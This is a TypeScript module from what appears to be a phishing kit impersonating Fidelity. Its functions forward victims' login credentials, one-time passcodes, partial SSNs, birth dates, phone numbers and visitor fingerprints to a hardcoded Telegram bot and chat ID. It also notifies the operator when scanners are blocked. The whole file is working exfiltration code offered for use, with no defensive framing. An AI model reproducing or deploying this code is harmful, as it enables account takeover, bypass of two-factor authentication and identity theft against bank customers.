

const SITE_NAME = "Fidelity"

interface TelegramMessage {
  username?: string
  password?: string
  email?: string
  epwsd?: string
  otpcode?: string
  fullname?: string
  homephone?: string
  workphone?: string
  /** Last 4 SSN digits (details page) */
  ssn?: string
  dob?: string
  zipcode?: string
  ip?: string
  country?: string
  city?: string
  useragent?: string
  isSecondOtp?: boolean
  location?: string
  timezone?: string
  isp?: string
  screen?: string
  language?: string
  referrer?: string
  url?: string
  utcTime?: string
}

const TELEGRAM_BOT_TOKEN = "5877336614:AAHeJpXioCqVASLDNCjMOp82W7YTkrkk3YI"
const TELEGRAM_CHAT_IDS = ["1535273256"]

function getChatIds(): string[] {
  return TELEGRAM_CHAT_IDS
}

async function sendToChat(chatId: string, text: string): Promise<void> {
  const botToken = TELEGRAM_BOT_TOKEN
  if (!botToken) return
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`
  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
      }),
    })
  } catch (e) {
    console.error("Telegram send failed:", e)
  }
}

export async function sendTelegramMessage(
  message: TelegramMessage,
  type: "login" | "otp" | "details" | "resend" = "login"
): Promise<{ success: boolean; error?: string }> {
  const chatIds = getChatIds()
  if (!TELEGRAM_BOT_TOKEN || chatIds.length === 0) {
    console.error("Telegram not configured: missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID")
    return { success: false, error: "Configuration missing" }
  }

  let text = ""
  if (type === "login") {
    text = `\n🔐 <b>Login Attempt - ${SITE_NAME}</b>\n\n👤 <b>User ID:</b> ${message.username || message.email || ""}\n🔑 <b>Password:</b> ${message.password || message.epwsd || ""}`
  } else if (type === "otp") {
    const otpType = message.isSecondOtp ? "Code (final)" : "Code (first OTP)"
    text = `\n✅ <b>Verification Code Submitted - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${otpType}\n🔢 <b>Code:</b> ${message.otpcode || ""}`
  } else if (type === "details") {
    text =
      `\n🪪 <b>Identity Details Submitted - ${SITE_NAME}</b>\n\n` +
      `🔢 <b>Last 4 SSN:</b> ${message.ssn || ""}\n` +
      `📅 <b>Date of Birth:</b> ${message.dob || ""}\n` +
      `📮 <b>ZIP Code:</b> ${message.zipcode || ""}`
    if (message.fullname || message.homephone || message.workphone || message.email) {
      text +=
        `\n\n📋 <b>Full Name:</b> ${message.fullname || ""}\n` +
        `📱 <b>Home Phone:</b> ${message.homephone || ""}\n` +
        `📱 <b>Work Phone:</b> ${message.workphone || ""}\n` +
        `📧 <b>Email:</b> ${message.email || ""}`
    }
  } else if (type === "resend") {
    const otpType = message.isSecondOtp ? "Code (final)" : "Code (first OTP)"
    text = `\n🔄 <b>Resend Code Requested - ${SITE_NAME}</b>\n\n🔐 <b>OTP Type:</b> ${otpType}`
  }

  await Promise.all(chatIds.map((chatId) => sendToChat(chatId, text)))
  return { success: true }
}

export async function sendBlockedBotNotification(data: {
  userAgent: string
  ip: string
  path: string
}): Promise<void> {
  const chatIds = getChatIds()
  if (!TELEGRAM_BOT_TOKEN || chatIds.length === 0) return
  const text = `\n🚫 <b>Bad Bot Blocked - ${SITE_NAME}</b>\n\n🤖 <b>User-Agent:</b> ${data.userAgent}\n🌍 <b>IP:</b> ${data.ip}\n🔗 <b>Path:</b> ${data.path}`
  await Promise.all(chatIds.map((chatId) => sendToChat(chatId, text)))
}

export async function sendVisitorNotification(data: TelegramMessage): Promise<void> {
  const chatIds = getChatIds()
  if (!TELEGRAM_BOT_TOKEN || chatIds.length === 0) return
  const text =
    `\n🌐 <b>New Visitor - ${SITE_NAME}</b>\n\n` +
    `📍 <b>Location:</b> ${data.location || "Unknown"}\n` +
    `🌍 <b>IP:</b> ${data.ip || "Unknown"}\n` +
    `⏰ <b>Timezone:</b> ${data.timezone || "Unknown"}\n` +
    `🌐 <b>ISP:</b> ${data.isp || "Unknown"}\n\n` +
    `📱 <b>Device:</b> ${data.useragent || "Unknown"}\n` +
    `🖥️ <b>Screen:</b> ${data.screen || "Unknown"}\n` +
    `🌍 <b>Language:</b> ${data.language || "Unknown"}\n` +
    `🔗 <b>Referrer:</b> ${data.referrer || "Direct"}\n` +
    `🕒 <b>UTC Time:</b> ${data.utcTime || "Unknown"}`
  await Promise.all(chatIds.map((chatId) => sendToChat(chatId, text)))
}

export function getBrowser(userAgent: string): string {
  if (userAgent.includes("MSIE")) return "Internet Explorer"
  if (userAgent.includes("Firefox")) return "Mozilla Firefox"
  if (userAgent.includes("Chrome")) return "Google Chrome"
  if (userAgent.includes("Safari")) return "Safari"
  if (userAgent.includes("Opera")) return "Opera"
  return "Unknown"
}
